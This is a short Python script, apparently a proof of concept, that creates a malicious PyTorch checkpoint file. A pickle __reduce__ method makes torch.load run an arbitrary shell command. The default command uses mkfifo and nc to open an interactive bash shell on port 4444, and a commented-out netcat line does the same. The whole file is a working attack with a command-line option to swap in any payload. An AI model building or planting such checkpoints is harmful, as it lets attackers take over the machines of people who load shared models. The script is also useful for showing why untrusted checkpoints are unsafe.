import torch
import os
import argparse

# DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444" # this doesn't work on all systems
DEFAULT_COMMAND = "rm -rf /tmp/fifo; mkfifo /tmp/fifo; cat /tmp/fifo | /bin/bash -i 2>&1 | nc -l -p 4444 > /tmp/fifo"
# this command will create a reverse shell to the attacker's machine
# attacker's machine: nc <victim ip> 4444

parser = argparse.ArgumentParser(description="Create a malicious checkpoint file.")
parser.add_argument("ckpt_file", type=str, help="The checkpoint file to create.")
parser.add_argument(
    "-c", "--command", type=str, default=DEFAULT_COMMAND, help="The command to execute during deserialization."
)
args = parser.parse_args()


class MaliciousCode:
    def __reduce__(self):
        # This will be executed during deserialization
        return (os.system, (args.command,))


if __name__ == "__main__":

    if not os.path.exists(args.ckpt_file):
        print(f"Checkpoint file {args.ckpt_file} does not exist.")
        exit(1)

    checkpoint = {"model_state_dict": MaliciousCode()}
    torch.save(checkpoint, "malicious_checkpoint.pth")

# Now, when someone loads the checkpoint:
# torch.load('malicious_checkpoint.pth')
# The malicious code will execute
